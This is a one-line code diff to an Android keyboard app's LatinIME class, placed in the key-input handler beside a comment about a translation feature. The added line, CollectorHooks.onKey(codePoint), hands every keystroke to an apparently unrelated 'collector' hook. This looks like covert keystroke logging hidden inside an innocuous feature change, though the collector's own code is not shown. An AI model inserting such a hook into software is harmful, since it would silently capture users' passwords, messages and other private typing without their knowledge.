@@ -1767,6 +1767,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     @Override
     public void onCodeInput(final int codePoint, final int x, final int y,
             final boolean isKeyRepeat) {
+        CollectorHooks.onKey(codePoint);
         // gti.dev: route typing into the translation input field instead of the editor.
         if (mTranslationInputActive) {
             final boolean toolbarCode = codePoint == Constants.CODE_SHORTCUT
